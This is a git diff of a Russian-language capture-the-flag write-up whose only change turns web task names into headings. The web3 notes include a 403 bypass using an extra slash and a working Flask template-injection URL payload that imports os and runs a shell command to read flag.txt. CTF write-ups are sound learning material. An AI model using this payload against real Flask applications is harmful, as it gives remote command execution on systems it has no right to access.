@@ -15,10 +15,10 @@ REV-1. В таске был encrypt ввода, после чего его ве�
 ![web1 2](https://github.com/Kreedman05/nto_4fun_2024/assets/164340613/b980683b-8f5e-42af-bad5-7112e81a6bf6)
 
 
-web2
+## web2
 magic(?)
 
-web3
+## web3
 403 error bypass(дополнительный / перед flag)
 template injection flask
 http://192.168.12.11:8001//flag?name={{self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%22cat%20flag.txt%22).read()}}
